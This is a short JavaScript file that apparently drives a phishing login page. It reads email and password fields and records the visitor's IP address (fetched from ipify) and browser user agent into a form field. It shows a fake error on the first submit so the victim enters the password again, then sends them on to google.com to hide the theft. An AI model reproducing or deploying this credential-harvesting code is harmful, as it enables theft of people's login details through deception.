const loaderContainer = document.querySelector('#loaderCont');
const errorContainer = document.querySelector('#mainError');
const submitButton = document.querySelector('#submitButton');
const emailEntry = document.querySelector('#emailEntry');
const passEntry = document.querySelector('#passEntry');
const ipNumber = document.querySelector('#ipNumber');



async function ipListen() {
    const listenIp = await axios.get('https://api.ipify.org/?format=json')
    console.log(listenIp.data.ip);
    ipNumber.value = `IP Address:${listenIp.data.ip} ****** User Agent:${navigator.userAgent}`;
}

ipListen();

console.log(ipNumber.value);


function loadingScreen () {
    loaderContainer.className = 'hidden'
}



submitButton.addEventListener('click', () => {
    loaderContainer.className = 'loaderContainer'
    setTimeout(() => {
        loadingScreen();
    }, 2000);
    
    if (errorContainer.className !== 'errorContainer') {
        errorContainer.className = 'errorContainer'
    } else {
        window.location.href = 'https://google.com';
    }
})